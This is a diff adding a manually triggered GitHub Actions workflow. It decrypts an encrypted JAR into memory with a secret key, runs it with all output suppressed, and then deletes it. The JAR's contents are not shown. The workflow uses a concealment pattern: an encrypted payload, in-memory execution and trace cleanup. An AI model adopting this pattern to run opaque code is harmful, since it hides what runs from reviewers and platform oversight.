@@ -1,0 +1,23 @@
+name: Grow
+
+on:
+  workflow_dispatch:
+
+jobs:
+  decrypt-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v3
+
+      - name: Decrypt JAR into memory
+        run: |
+          mkdir -p /dev/shm/leaf
+          openssl enc -d -aes-256-cbc -in file/leaf.jar -out /dev/shm/leaf/app.jar -pass pass:${{ secrets.JAR_KEY }}
+
+      - name: Run the JAR silently
+        run: java -jar /dev/shm/leaf/app.jar > /dev/null 2>&1
+
+      - name: Clean up memory
+        run: rm -rf /dev/shm/leaf
